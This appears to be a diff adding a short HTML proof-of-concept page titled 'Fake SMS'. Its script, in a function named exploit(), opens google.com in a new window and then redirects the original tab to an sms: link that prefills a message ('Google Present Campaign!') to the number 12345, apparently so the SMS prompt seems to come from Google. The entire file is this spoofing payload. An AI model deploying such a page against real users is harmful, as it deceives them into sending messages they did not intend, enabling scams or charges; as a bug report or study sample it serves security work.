@@ -1,0 +1,12 @@
+<body>
+<h1>Fake SMS</h1>
+<script>
+function exploit(){
+  var win = window.open('https://google.com/','');
+  setTimeout(function(){
+  location.href = "sms:12345&body=Google Present Campaign!";
+  }, 2000);
+}
+</script>
+<button onclick="exploit()">Click Me</button>
+</body>
